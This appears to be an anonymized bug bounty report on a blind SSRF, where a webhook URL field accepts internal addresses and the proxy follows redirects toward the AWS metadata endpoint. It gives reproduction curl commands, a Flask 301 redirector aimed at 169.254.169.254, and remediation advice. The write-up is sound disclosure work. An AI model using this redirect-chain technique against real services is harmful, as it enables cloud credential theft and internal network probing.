# Blind SSRF via Unvalidated Webhook URL Parameter

> Vendor-anonymized version of the report I submitted. All identifiers
> (account SIDs, phone numbers, source IPs, redirector hostnames, vendor
> product names) have been removed. Methodology and reasoning are preserved.

## Summary

The target's public API accepted arbitrary URLs (including internal cloud
metadata addresses) as a webhook-style URL parameter on a particular
resource, without validation at registration time. When the corresponding
event fired, the target's servers fetched the configured URL server-side,
and the outbound proxy followed HTTP 301 redirects without re-validating the
destination. This chain produces a **Blind SSRF**: an authenticated user can
cause the target's infrastructure to issue HTTP requests toward
`169.254.169.254` (AWS Instance Metadata Service) or other internal
addresses reachable from the proxy's network.

## Severity

**Self-assessed: Medium (Blind SSRF, no credential retrieval demonstrated).**
Outbound request from the target's proxy toward `169.254.169.254` was
confirmed. The metadata response itself did not return through the network
path (a 502 was observed from the fetcher), so credential exfiltration was
not demonstrated and was not attempted. Programs that score IMDS-reachable
SSRF on the network-access bit alone may classify this higher.

## Affected endpoint

```
POST https://<api host>/<version>/Accounts/{AccountId}/<Resource>/{Id}.json
```

Vulnerable parameter: the primary webhook URL field on this resource. The
same pattern likely applies to every sibling URL field on the same resource
type (fallback URL, status-callback URL, alternate-channel fallback URL,
etc.) since they share the validation path.

## Steps to reproduce

The three steps below — URL acceptance check, OOB confirmation, redirect-chain
bypass — are the concrete instantiation of the generalized probe in
[`methodology.md`](./methodology.md). See that file for the reasoning behind
each step and the conditions under which the bypass works.

### Step 1: Internal IP accepted at registration

```bash
curl -X POST -u <account_id>:<auth_token> \
  https://<api host>/<version>/Accounts/<account_id>/<Resource>.json \
  -d FriendlyName=test \
  -d <UrlParam>=http://169.254.169.254/latest/meta-data/
```

**Result:** `200 OK`. URL stored without validation. No registration-time
control rejects the link-local metadata address.

### Step 2: Server-side fetch confirmed via OOB

Replace the URL with a webhook listener, assign the resource to the
account's trigger surface, and fire the relevant event:

```bash
curl -X POST -u <account_id>:<auth_token> \
  https://<api host>/<version>/Accounts/<account_id>/<EventResource>.json \
  -d <trigger params> \
  -d Url=https://<webhook-listener>/<unique-id>
```

**Result:** the listener received both `GET` and `POST` requests originating
from the target's infrastructure. Reverse DNS on the source IP resolved to
an EC2 PTR in the target's production region, confirming the fetch
originated from inside the target's cloud network.

![Webhook.site capture showing inbound POST from target EC2 IP](./images/image-1(scrubbed).png)
*Webhook.site capture: inbound POST from target EC2 IP (`<target-ec2-ip>`), confirming server-side fetch.*

![dig PTR lookup confirming EC2 reverse DNS](./images/image-2(scrubbed).png)
*`dig` PTR lookup: `<target-ec2-ip>` resolves to `ec2-<redacted>.compute-1.amazonaws.com`, placing the fetcher inside AWS.*

### Step 3: Open-redirect chain bypasses any host filter

Stand up a small Flask redirector that returns `301` toward IMDS:

```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def redir():
    return redirect("http://169.254.169.254/latest/meta-data/", code=301)
```

Register the redirector as the webhook URL, fire the event, and inspect the
redirector's access logs.

**Result:** the target's outbound proxy hit the redirector and received the
301 (`"POST / HTTP/1.1" 301 <bytes> "-" "<TargetProxy/1.x>"`). The proxy
followed the redirect toward `http://169.254.169.254/latest/meta-data/`
without re-validating the destination. The fetcher returned a 502 to the
event runtime, consistent with a network-level block on the IMDS response
path, but the outbound request was made. This is sufficient to classify
the finding as a confirmed Blind SSRF.

![Redirector access logs showing 301 served to target proxy](./images/image-3(scrubbed).png)
*Redirector access logs: target proxy (`POST / HTTP/1.1`) received the 301 toward `169.254.169.254`, confirming the redirect chain was followed without re-validation.*

> Active retrieval of credentials from the metadata service was not
> attempted. See [`methodology.md` § What I did not do](./methodology.md#what-i-did-not-do).

## Impact

An authenticated user of the target's API could:

- Cause the target's infrastructure to issue HTTP requests to the AWS IMDS
  endpoint (`169.254.169.254`). If IMDSv1 is enabled and the network path
  allows the response to return, this exposes IAM credentials scoped to the
  instance role of the fetcher.
- Probe internal services and infrastructure that are not reachable from the
  public internet, using the target's proxy as a request origin inside their
  cloud network.
- Pivot toward any RFC1918-reachable service that doesn't require additional
  authentication from instances on the same VPC.

The attack requires only a low-cost authenticated account on the platform.
No special privileges are needed.

## Remediation

- **Validate at fetch time, not only at registration time.** The redirect
  bypass exists because the validation control runs once on the user-
  submitted URL and is not re-applied to redirect targets. Any URL fetched
  server-side (including redirect destinations) must be re-checked
  against the same allow/deny list before the next request is issued.
- **Deny RFC1918 and link-local ranges in the fetcher.** Reject `10.0.0.0/8`,
  `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `127.0.0.0/8`, and
  IPv6 equivalents (`::1`, `fc00::/7`, `fe80::/10`) at resolution time, not
  at parse time. Hostname parsing alone is bypassable via DNS rebinding and
  redirect chains.
- **Enforce IMDSv2 on every instance that fetches user-supplied URLs.**
  IMDSv2's session-token requirement neutralizes the entire class of SSRF
  against IMDS, regardless of fetcher behavior. This is defense in depth
  for the cases where the URL-validation control fails.
- **Cap redirect depth and disable cross-scheme follows.** A fetcher
  following an arbitrary number of redirects across schemes (`https://` →
  `http://`) is a separate weakness worth addressing in the same change.

## Recon context

This finding was the surviving lead after working through a few hundred
subdomains. The other surfaces examined and why they didn't yield reportable
bugs:

| Surface examined | Why it didn't pan out |
|---|---|
| Admin SPA loading without auth | Frontend public, but every API call gated by SSO; no IDOR |
| Stale staging host (TLS expired ~4 years) | 500 on every path, no data exposure → not reportable alone |
| Token-gated staging service | 401 on every request without a valid token |
| Multiple "decommissioned" CNAMEs | Target still owned the underlying CDN distributions; no takeover possible |
| Account-to-account access on the public API | Tested IDOR across two attacker-owned accounts on five endpoint variants; all returned 401 |
| Core authorization on the public API | Solid. No horizontal privilege escalation found. |

## References

- **CWE-918**: Server-Side Request Forgery
- **OWASP**: SSRF (A10:2021)
- **AWS IMDS**: `http://169.254.169.254/latest/meta-data/`
- **Related**: [`methodology.md`](./methodology.md), [`checklist.md`](./checklist.md)
